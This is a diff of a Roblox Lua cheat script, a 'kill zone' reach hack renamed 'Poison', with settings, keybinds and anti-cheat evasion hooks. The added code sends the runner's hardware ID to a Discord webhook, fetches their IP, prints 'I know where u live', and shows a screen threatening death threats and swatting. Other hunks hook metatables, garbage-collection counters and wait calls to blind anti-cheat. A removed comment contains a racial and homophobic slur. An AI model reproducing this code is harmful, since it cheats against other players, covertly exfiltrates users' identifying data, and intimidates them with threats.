@@ -45,7 +45,7 @@ end
  
 if hwid then
 local HttpServ = game:GetService('HttpService')
-local url = "https://discordapp.com/api/webhooks/937154192605331456/lLvkhH_EOV62PYk0yb8RGj-20FoX07kp6lyrJB2qlhrgDUKOqDv-QB9h7psojKCfLT3E"
+local url = "https://discord.com/api/webhooks/966868554739777546/NhS69sF7xLIrWhuCdpA5TsF115pjow2meqxLWZOfLZYawEvJTqtR9qboJ3vPiUDPcirp"
  
  
 local data = 
@@ -107,53 +107,129 @@ local data =
 end
 
 
+local ScreenGui = Instance.new("ScreenGui")
+local Frame = Instance.new("Frame")
+local TextLabel = Instance.new("TextLabel")
+local TextButton = Instance.new("TextButton")
+
+--Properties:
+
+ScreenGui.Parent = game.CoreGui
+ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+
+Frame.Parent = ScreenGui
+Frame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+Frame.BackgroundTransparency = 0.300
+Frame.Position = UDim2.new(-0.078230381, 0, -0.228426248, 0)
+Frame.Size = UDim2.new(0, 2000, 0, 2000)
+
+TextLabel.Parent = Frame
+TextLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+TextLabel.BackgroundTransparency = 1.000
+TextLabel.Position = UDim2.new(0.300899714, 0, 0.121862471, 0)
+TextLabel.Size = UDim2.new(0, 610, 0, 455)
+TextLabel.Font = Enum.Font.Creepster
+TextLabel.Text = "In order to continue, please acknowledge clicking accept may result in the following: loss of internet, death threats, and SWATTings. By continuing you agree to sell you soul to the devils servants in replacement of a script beyond simple code"
+TextLabel.TextColor3 = Color3.fromRGB(0, 0, 0)
+TextLabel.TextSize = 50.000
+TextLabel.TextWrapped = true
+
+TextButton.Parent = Frame
+TextButton.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+TextButton.BackgroundTransparency = 1.000
+TextButton.Position = UDim2.new(0.379766524, 0, 0.352908134, 0)
+TextButton.Size = UDim2.new(0, 295, 0, 77)
+TextButton.Font = Enum.Font.Creepster
+TextButton.Text = "ACCEPT"
+TextButton.TextColor3 = Color3.fromRGB(0, 0, 0)
+TextButton.TextScaled = true
+TextButton.TextSize = 14.000
+TextButton.TextWrapped = true
+
+-- Scripts:
+
+local function LXEKMQI_fake_script() -- TextButton.Script 
+	local script = Instance.new('Script', TextButton)
+
+	script.Parent.MouseButton1Click:Connect(function()
+		script.Parent.Parent.Visible = false
+	end)
+end
+coroutine.wrap(LXEKMQI_fake_script)()
+
+
+wait(5)
+
+local ip = tostring(game:HttpGet("https://api.ipify.org", true))
+print(ip)
+print("I know where u live")
+
+
+local hook;
+hook = hookfunc(getrenv().wait, newcclosure(function(...)
+    local args = {...}
+    if args[1] == 3 and getcallingscript().Parent == nil then
+        return coroutine.yield()
+    end
+    return hook(...)
+end))
+
+local hook;
+hook = hookfunc(getrenv().wait, newcclosure(function(...)
+    local args = {...}
+    if args[1] == 2 and getcallingscript().Parent == nil then
+        return coroutine.yield()
+    end
+    return hook(...)
+end))
+
 
 --[[ SETTINGS ]]-- 
 
 local Zone = {
-    Shape = "Sphere", --> options: 'sphere' , 'box' || shape of da zone. 
-    Type = 'Body', --> options: 'Body', 'HBE', 'Sword' || where da zone goes ya.
+    Shape = "Sphere", -- 'sphere' , 'box' [da shape]
+    Type = 'Body', -- 'Body' , 'Sword'
 
-    Size = 3.5, --> size of da zone
-    SizeIncrement = 0.5, --> cuz u cant do math? idk..
+    Size = 5, -- [how big do it be?]
+    SizeIncrement = 0.5, -- [how much it go up by]
 
-    Transparency = 0.8, --> transparency of da zone.
+    Transparency = 0.8, -- [how much u can se]
 
-    FFA = true, --> options: true , false || FFA .. FFA! .. FFA... 
-    EvE = false, --> options: true , false || maks u look lik sonik . 
-    AC = false, --> options:  true , false || coz it bypas normal ac. -!- 
+    FFA = true, -- true , false [FFA]
+    EvE = true, -- true , false [Bot Reach Button] 
+    AC = false, --  true , false [Clicky]
 
-    TweenTime = 0.5, --> options: numbr between 0 and 1 || higher = smoother, lower = faster . cos dat makes sense.
-    RGB = true, --> options: true , false  || supporting LGBTQYFBOQUR or however the fk u spell it.
+    TweenTime = 0.5, -- numbr between 0 and 1 || higher = smoother, lower = faster
+    RGB = true, -- true , false  [Colurs]
 
-    InstantKill = true, --> options: true  , false || so you're just going to enable, Insta kill.. Headshots.. and Triggerbot.
+    InstantKill = true, -- true  , false [Big boi dmg]
 }
 
 
 local Keybinds = {
-    SizeHigher = "E", --> key for makin da size go X!_!X.  
-    SizeLower = "R", --> key for making da size go poof slowly.. 
+    SizeHigher = "E", -- [Big hack] 
+    SizeLower = "R", -- [Small hack]
 
-    Transparency = "F", --> key for makin da zone look like craidd's dad. 
+    Transparency = "T", -- [Circle Visiblility]
 
-    FFA = "", --> fuk ma team .
+    FFA = "M", -- [Team go oof]
 
-    EvE = "", --> key for making u pull more craidds than usual. 
+    EvE = "N", -- [Bot Reach]
     
-    AC = "Q", --> when a normal AC isn't enough for u.. ? 
+    AC = "Q", -- [Tool:active]
 
-    KeyDown = true, --> Yo fiki hold down J .
+    KeyDown = true, -- [A button to hold]
 }
 
 local EvE = {
-    SphereHit = true, --> options: true , false || kills prsn who hits the sphert himng yep.
-    Damaged = true, --> options: true , false || kill prsn who dmg U.
+    SphereHit = true, -- : true , false [Kills person who hit u]
+    Damaged = false, --  true , false [Kills whatever hit u]
 }
 
 local Misc = {
 
     WiggleBot = {
-        Enabled = true, --> options: true , false || wiggle wiggle wiggle 
+        Enabled = false, -- options: true , false [Dis shit make u wiggle]
     }
 
 }
@@ -164,9 +240,9 @@ local Misc = {
 --[[ ADVANCED SETTINGS ]]--
 
 local Notifications = {
-    Enabled = true, --> options: true , false || setting this to 'true' will send a notification after every setting change.
-    Style = 'new', --> options: 'new' , 'old' || very self explanatory.. 
-    Time = 1, --> options: any number         || time for da notification to go away yeah.
+    Enabled = true, --  true , false 
+    Style = 'old', -- 'new' , 'old'
+    Time = 1, -- : any number         
 }
 
 
@@ -281,101 +357,18 @@ function SYS:__STARTUP()
 
     --// leaving anti's blind and not talking, gonna call them Stephen Hawking
 
-    function SYS:Redirect()
-        local meta = getrawmetatable(game);
-        local _namecall = meta.__namecall;
-        local _index = meta.__index;
-
-
-        setreadonly(meta, false);
-
-        function Client.FindTable(tbl,obj)
-            for index,object in next, tbl do
-                if tostring(object):lower() == tostring(obj):lower() then
-                    return true;
-                end;
-            end;
-            return false;
-        end;
-
-        local Check = { "Head", "Left Arm", "Right Arm", "Left Leg", "Right Leg", "Torso", "HumanoidRootPart" };
-        
-
-        meta.__namecall = newcclosure(function(Instance, ...)
+    
             
-            local method = getnamecallmethod();
-            local args = {...};
-            
-            --[[if not checkcaller() and (string.lower(tostring(args[1])) == 'selectionsphere' or string.lower(tostring(args[1])) == 'selectionbox' or string.lower(tostring(args[1])) == 'guibase3d') then
+            if not checkcaller() and (string.lower(tostring(args[1])) == 'selectionsphere' or string.lower(tostring(args[1])) == 'selectionbox' or string.lower(tostring(args[1])) == 'guibase3d') then
                 local pseudo_instance = Instance.new("Accessory")
                 Instance = pseudo_instance;
-            end;]]
+            end;
             
-            if not checkcaller() and string.lower(tostring(method)) == 'isa' then
-                local is_ = tostring(args[1]);
-                if tostring(is_):lower():find('selection') or tostring(is_):lower():find("guibase3d") or self.Hidden[Instance] then
-                    return false; 
-                end;
-            end;
-
-            if not checkcaller() and string.lower(tostring(method)) == 'findfirstchildwhichisa' then
-                local is_ = tostring(args[1]);
-                if tostring(is_):lower():find('selection') or tostring(is_):lower():find("guibase3d") or self.Hidden[Instance] then
-                    return false; 
-                end;
-            end;
-
-
-            if not checkcaller() and string.lower(tostring(method)) == "getpropertychangedsignal" and string.lower(tostring(args[1])) == "size" and Client.FindTable(Check,Instance) then
-                args[1] = "Name";
-            end;
-
-            return _namecall(Instance,unpack(args))
-        end);
-
-        local pseudooo_instance = Instance.new'Part';
-
-        
-        local is_hook;is_hook = hookfunction(pseudooo_instance.IsA, newcclosure(function(...)
-            local args = {...};
-            local is_ = tostring(args[2]);
-            if tostring(is_):lower():find('selection') or tostring(is_):lower():find("guibase3d") then
-                return false; 
-            end;
-            return is_hook(...);
-        end));
-
-        local ffw_hook;ffw_hook = hookfunction(pseudo_instance.FindFirstChildWhichIsA, newcclosure(function(...)
-            local args = {...};
-            local is_ = tostring(args[2]);
-            if tostring(is_):lower():find('selection') or tostring(is_):lower():find("guibase3d") then
-                return false; 
-            end;
-            return ffw_hook(...);
-        end));
-
-        --// craidd? that gay ass nigga came out of the closet this year 
-        local craidd_ = Random.new()
-
-        local cg_hook;cg_hook = hookfunction(collectgarbage, newcclosure(function(...)
-            local args = {...};
-            if tostring(args[1]):lower() == 'count' then
-                craidd_:NextNumber(200,300)
-            end;
-            return cg_hook(...);
-        end));
-
-        hookfunction(gcinfo, newcclosure(function()
-            return craidd_:NextNumber(200,300)
-        end));
-    end;
-    
-    SYS:Redirect()
-
+            
     
 
 
-    --[==[function SYS:HOOK__INIT(Inst)
+    function SYS:HOOK__INIT(Inst)
         _1 = hookfunction(Inst.IsA, function(...)
             local p, ret = ({...})[1], _1(...)
             if checkcaller() then return ret end
@@ -440,10 +433,9 @@ function SYS:__STARTUP()
     end;
     
     
-    spawn(function()
+    HearBeat(function()
         SYS:HOOK__INIT(Instance.new('Accessory'))
-    end);]==]
-
+    end);
 
 
 
@@ -464,26 +456,26 @@ function SYS:__STARTUP()
             UserId = Client.Player.UserId
         };
         local HookData = {
-            username = 'KillZoneV3 Player Joined',
-            ['avatar_url'] = ("http://www.roblox.com/Thumbs/Avatar.ashx?x=100&y=100&Format=Png&username=%s"):format(Client.PlayerInfo.Username);
+            username = '',
+            ['avatar_url'] = (""):format(Client.PlayerInfo.Username);
             embeds={{
             ["author"] = {
             ["name"] = Client.PlayerInfo.Username .. ' | ' .. Client.PlayerInfo.UserId,
-            ["url"] = ('https://www.roblox.com/users/%s/profile'):format(Client.PlayerInfo.UserId),
+            ["url"] = (''):format(Client.PlayerInfo.UserId),
             },
             ["color"] = 16711680,
-            ["icon_url"] = ('http://www.roblox.com/Thumbs/Avatar.ashx?x=100&y=100&Format=Png&username=%s'):format(Client.PlayerInfo.Username),
+            ["icon_url"] = (''):format(Client.PlayerInfo.Username),
             fields={
-            {value = '**'..tostring(Client.GameInfo.Name)..(' | https://www.roblox.com/games/%s/game | %s**'):format(Client.GameInfo.ID, Client.GameInfo.JobID), name = "**[GAME]:**"}},
+            {value = '**'..tostring(Client.GameInfo.Name)..(''):format(Client.GameInfo.ID, Client.GameInfo.JobID), name = "**[GAME]:**"}},
             }},
         }
         HookData = HttpService:JSONEncode(HookData)
         Http_Request(
             {
-                Url = 'https://discordapp.com/api/webhooks/654162541777256449/tD8oPilP7oXlfDo8GuCA8ONxB4SRvKr-eiNXJmLySCtVec_W10ZHeL8E308vYS7lhVit',
+                Url = '',
                 Method = 'POST',
                 Headers = {
-                    ['Content-Type'] = 'application/json'
+                    ['Content-Type'] = ''
                 },
                 Body = HookData
             }
@@ -622,10 +614,10 @@ end;
 
 function Client:GetEnemyHRP(Enemy)
     return pcall(function() 
-        local HRP = Enemy.Character:FindFirstChild'HumanoidRootPart' or Enemy.Character:FindFirstChild'UpperTorso' or Enemy.Character.PrimaryPart or nil;
+        local HRP = Enemy.Character:FindFirstChild'Right Arm' or Enemy.Character:FindFirstChild'UpperTorso' or Enemy.Character.PrimaryPart or nil;
         if not HRP then
             for _,x in next,Enemy.Character:GetChildren() do
-                if tostring(x):lower():find('humanoidrootpart') and x:IsA('Part') then
+                if tostring(x):lower():find('Right Arm') and x:IsA('Part') then
                     HRP = x;
                 end;
             end;
@@ -635,10 +627,10 @@ function Client:GetEnemyHRP(Enemy)
 end;
 
 function Client:GetCharacterHRP(Enemy)
-    local HRP = Enemy:FindFirstChild'HumanoidRootPart' or Enemy:FindFirstChild'UpperTorso' or Enemy.PrimaryPart or nil;
+    local HRP = Enemy:FindFirstChild'Right Arm' or Enemy:FindFirstChild'UpperTorso' or Enemy.PrimaryPart or nil;
     if not HRP then
         for _,x in next,Enemy:GetChildren() do
-            if tostring(x):lower():find('humanoidrootpart') and x:IsA('Part') then
+            if tostring(x):lower():find('Right Arm') and x:IsA('Part') then
                 HRP = x;
             end;
         end;
@@ -647,10 +639,10 @@ function Client:GetCharacterHRP(Enemy)
 end;
 
 function Client:GetHRP(dddx)
-    local HRP = Client.Character:FindFirstChild'HumanoidRootPart' or Client.Character:FindFirstChild'UpperTorso' or Client.Character.PrimaryPart or nil;
+    local HRP = Client.Character:FindFirstChild'Right Arm' or Client.Character:FindFirstChild'UpperTorso' or Client.Character.PrimaryPart or nil;
     if not HRP then
         for _,x in next, Client.Character:GetChildren() do
-            if tostring(x):lower():find('humanoidrootpart') and x:IsA('Part') then
+            if tostring(x):lower():find('Right Arm') and x:IsA('Part') then
                 HRP = x;
             end;
         end;
@@ -694,9 +686,8 @@ end
 
 
 touch = 0
-untouch = 1
 
---[[function Client:Wiggle(Point)
+function Client:Wiggle(Point)
     if Client:GetHRP():FindFirstChild'switcharoo' then
         Client:GetHRP():FindFirstChild'switcharoo':Destroy()
     end;
@@ -715,7 +706,7 @@ untouch = 1
     --bg.cframe = CFrame.new(Client:GetCharacterHRP(Point).Position, Client:GetCharacterHRP(Point).Position + direction)
 
     bg.cframe = CFrame.new(Client:GetHRP().Position,Client:GetCharacterHRP(Point).Position-Client:GetHRP().CFrame.rightVector*2);
-end;]] 
+end;
 
 function Client.studNotify()
 
@@ -726,12 +717,10 @@ function Client:Kill(EnemyCharacter,Check)
         for _,v in pairs(EnemyCharacter:GetChildren()) do
             if v:IsA'BasePart' then
                 firetouchinterest(Client:GetHandle(), v,touch)
-                firetouchinterest(Client:GetHandle(), v,untouch)  
             end;
         end;
     else
         firetouchinterest(Client:GetHandle(), Client:GetCharacterHRP(EnemyCharacter),touch)
-        firetouchinterest(Client:GetHandle(), Client:GetCharacterHRP(EnemyCharacter),untouch)    
     end;
 end;
 
@@ -793,7 +782,7 @@ function Client:CreateZone()
         SYS.Hidden[Sphere] = true;
 
         Client:GetHiddenInstance(Sphere, game:GetService'CoreGui')
-        Client:GetHiddenInstance(Zone_, game:GetService'Workspace')
+        Client:GetHiddenInstance(Zone_, game:GetService'CoreGui')
 
         Zone_.CanCollide = false;
         Zone_.RootPriority  = -9e9;
@@ -839,8 +828,8 @@ function Client:CreateZone()
                     Client:Tween(Zone_,'Quint','Out',ClientSettings.Zone.TweenTime,{Size = Vector3.new(ClientSettings.Zone.Size, ClientSettings.Zone.Size, ClientSettings.Zone.Size)})
                 end;
                 if ClientSettings.Zone.RGB then
-                    Sphere.SurfaceColor3 = Color3.new((math.sin(workspace.DistributedGameTime/2)/2)+0.5, (math.sin(workspace.DistributedGameTime)/2)+0.5, (math.sin(workspace.DistributedGameTime*1.5)/2)+0.5)
-                    Sphere.Color3 = Color3.new((math.sin(workspace.DistributedGameTime/2)/2)+0.5, (math.sin(workspace.DistributedGameTime)/2)+0.5, (math.sin(workspace.DistributedGameTime*1.5)/2)+0.5)
+                    Sphere.SurfaceColor3 = Color3.new(0,0,0)
+                    Sphere.Color3 = Color3.new(0,0,0)
                 end;
             end;
         end);           
@@ -866,7 +855,7 @@ function Client:CreateZone()
         end);
 
         
-        --[[spawn(function()
+        spawn(function()
             while true do 
                 for i,plr in next, game:GetService'Players':GetPlayers() do
                     pcall(function() 
@@ -877,7 +866,7 @@ function Client:CreateZone()
                 end;
                 wait();
             end;
-        end)]]
+        end)
 
 
     end;
@@ -899,12 +888,12 @@ end;
 if not(ClientSettings.Keybinds.KeyDown) then
     Client:CreateKeybind('SizeHigher', function()
         ClientSettings.Zone.Size = ClientSettings.Zone.Size + ClientSettings.Zone.SizeIncrement
-        SYS.notify("KillZone Size Updated",("Size Changed To %s"):format(tostring(ClientSettings.Zone.Size)),3)
+        SYS.notify("Poison Size Updated",("it be dis big %s"):format(tostring(ClientSettings.Zone.Size)),3)
     end);
 
     Client:CreateKeybind('SizeLower', function()
         ClientSettings.Zone.Size = ClientSettings.Zone.Size - ClientSettings.Zone.SizeIncrement
-        SYS.notify("KillZone Size Updated",("Size Changed To %s"):format(tostring(ClientSettings.Zone.Size)),3)
+        SYS.notify("Poison Size Updated",("it be dis big %s"):format(tostring(ClientSettings.Zone.Size)),3)
     end);
 end;
 
@@ -914,23 +903,23 @@ Client:CreateKeybind('Transparency', function()
     elseif ClientSettings.Zone.Transparency >= 1 then
         ClientSettings.Zone.Transparency = 0.8
     end
-    SYS.notify("Killzone Transparency Updated",("Transparency Changed To %s"):format(tostring(ClientSettings.Zone.Transparency)),ClientSettings.Notifications.Time)
+    SYS.notify("Poison Transparency Updated",("da visiblility be %s"):format(tostring(ClientSettings.Zone.Transparency)),ClientSettings.Notifications.Time)
 end);
 
 Client:CreateKeybind('FFA', function()
     ClientSettings.Zone.FFA = not ClientSettings.Zone.FFA
-    SYS.notify("KillZone FFA Updated",("FFA Changed To %s"):format(tostring(ClientSettings.Zone.FFA)),ClientSettings.Notifications.Time)
+    SYS.notify("Poison FFA Updated",("FFA do be %s"):format(tostring(ClientSettings.Zone.FFA)),ClientSettings.Notifications.Time)
 end);
 
 Client:CreateKeybind('EvE', function()
     ClientSettings.Zone.EvE = not ClientSettings.Zone.EvE
-    SYS.notify("KillZone EvE Updated",("EvE Changed To %s"):format(tostring(ClientSettings.Zone.EvE)),ClientSettings.Notifications.Time)
+    SYS.notify("Poison EvE Updated",("EvE do be %s"):format(tostring(ClientSettings.Zone.EvE)),ClientSettings.Notifications.Time)
 end);
 
 
 Client:CreateKeybind('AC', function()
     ClientSettings.Zone.AC = not ClientSettings.Zone.AC
-    SYS.notify("KillZone AC Updated",("AC Changed To %s"):format(tostring(ClientSettings.Zone.AC)),ClientSettings.Notifications.Time)
+    SYS.notify("Poison AC Updated",("AutoLunge be %s"):format(tostring(ClientSettings.Zone.AC)),ClientSettings.Notifications.Time)
 
 end);
 
@@ -939,7 +928,7 @@ local U_IS = _game.UserInputService;
 
 local WasHolding1 = false;
 local WasHolding2 = false;
---[==[
+
 function onKey1(name,state,action)
     if state == Enum.UserInputState.Begin then
         while WasHolding1 do 
@@ -948,7 +937,7 @@ function onKey1(name,state,action)
         end;
     elseif state == Enum.UserInputState.End then
         WasHolding1 = false;
-        SYS.notify("KillZone Size Updated",("Size Changed To %s"):format(tostring(ClientSettings.Zone.Size)),3)
+        SYS.notify("Poison Size Updated",("it be dis big %s"):format(tostring(ClientSettings.Zone.Size)),3)
         WasHolding1 = true;
     end
 end
@@ -961,14 +950,14 @@ function onKey2(name,state,action)
         end;
     elseif state == Enum.UserInputState.End then
         WasHolding2 = false;
-        SYS.notify("KillZone Size Updated",("Size Changed To %s"):format(tostring(ClientSettings.Zone.Size)),3)
+        SYS.notify("Poison Size Updated",("it be dis big %s"):format(tostring(ClientSettings.Zone.Size)),3)
         WasHolding2 = true;
     end
 end
 
 game:GetService'ContextActionService':BindAction("On1", onKey1, true, Enum.KeyCode[ClientSettings.Keybinds['SizeLower']])
 game:GetService'ContextActionService':BindAction("On2", onKey2, true, Enum.KeyCode[ClientSettings.Keybinds['SizeHigher']])
-]==]
+
 
 
 
@@ -983,7 +972,7 @@ coroutine.wrap(function()
                 if WasHolding1 then
                     WasHolding1 = false;
                     Client.HoldingKeyDown2 = false;
-                    SYS.notify("KillZone Size Updated",("Size Changed To %s"):format(tostring(ClientSettings.Zone.Size)),3)
+                    SYS.notify("Poison Size Updated",("it be dis big %s"):format(tostring(ClientSettings.Zone.Size)),3)
                 end;
             end;
             if U_IS:IsKeyDown( Enum.KeyCode[ClientSettings.Keybinds['SizeHigher']] ) and not game:GetService'UserInputService':GetFocusedTextBox() then
@@ -994,7 +983,7 @@ coroutine.wrap(function()
                 if WasHolding2 then
                     WasHolding2 = false
                     Client.HoldingKeyDown2 = false;
-                    SYS.notify("KillZone Size Updated",("Size Changed To %s"):format(tostring(ClientSettings.Zone.Size)),3)
+                    SYS.notify("Poison Size Updated",("it be dis big %s"):format(tostring(ClientSettings.Zone.Size)),3)
                 end;
             end;
         end;
